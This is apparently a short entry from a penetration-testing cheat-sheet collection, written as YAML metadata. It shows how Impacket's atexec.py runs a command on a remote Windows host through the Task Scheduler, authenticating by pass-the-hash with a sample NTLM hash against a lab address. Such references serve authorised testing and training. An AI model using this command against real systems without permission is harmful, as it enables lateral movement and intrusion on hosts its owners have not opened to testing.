---
description: |
  Impacket's atexec.py uses the Task Scheduler service on the remote Windows host to execute the given command. It will create a windows task with a random name, trigger the task, and then delete it. The following command executes `whoami` on the remote Windows host, authenticating with the hash of user `john`.

  Command Reference:

  	Target IP: 10.10.10.1

  	Domain: test.local

  	Username: john

  	Hash: aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76

  	Command Executed: whoami
command: |
  python3 atexec.py -hashes aad3b435b51404eeaad3b435b51404ee:5fbc3d5fec8206a30f4b6c473d68ae76 test.local/john@10.10.10.1 whoami
items:
  - Hash
  - Username
services:
  - SMB
OS:
  - Linux
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py
  - https://u0041.co/blog/post/1
---
